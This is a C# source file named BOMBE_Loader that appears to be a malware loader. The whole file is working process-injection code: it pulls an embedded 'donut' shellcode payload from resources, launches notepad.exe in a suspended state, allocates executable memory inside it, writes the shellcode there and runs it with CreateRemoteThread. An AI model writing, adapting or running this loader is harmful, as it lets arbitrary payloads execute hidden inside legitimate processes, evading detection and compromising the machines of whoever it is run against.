using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BOMBE_Loader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        // CreateRemoteThread
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40; // RWX

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        static void Main(string[] args)
        {
            // donut shellcode
            byte[] shellcode = test_malware.Properties.Resources.payload;
            
            if (shellcode == null || shellcode.Length == 0)
            {
                Console.WriteLine("[-] Failed to load payload from resources.");
                return;
            }

            Console.WriteLine($"[+] Payload loaded. Size: {shellcode.Length} bytes");

            // x64 notepad.exe
            string targetProcess = @"C:\Windows\System32\notepad.exe";

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = (uint)Marshal.SizeOf(si);

            Console.WriteLine($"[+] Spawning {targetProcess} in SUSPENDED state...");

            bool success = CreateProcess(
                targetProcess,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED, // suspend
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (!success)
            {
                Console.WriteLine($"[-] Failed to create process. Error: {Marshal.GetLastWin32Error()}");
                return;
            }

            Console.WriteLine($"[+] Process created. PID: {pi.dwProcessId}");

            IntPtr allocMemAddress = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (allocMemAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            IntPtr bytesWritten;
            if (!WriteProcessMemory(pi.hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                Console.WriteLine("[-] WriteProcessMemory failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine($"[+] Shellcode written to 0x{allocMemAddress.ToString("X")}");

            uint remoteThreadId;
            IntPtr hRemoteThread = CreateRemoteThread(
                pi.hProcess,
                IntPtr.Zero,
                0,
                allocMemAddress,  // shellcode entrypoint
                IntPtr.Zero,
                0,
                out remoteThreadId);

            if (hRemoteThread == IntPtr.Zero)
            {
                Console.WriteLine($"[-] CreateRemoteThread failed. Error: {Marshal.GetLastWin32Error()}");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine($"[+] Remote thread created. TID: {remoteThreadId}");

            // resume main thread
            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Main thread resumed. Injection complete.");

            // we dont wait for notepad to exit, just clean up and exit
            CloseHandle(hRemoteThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}
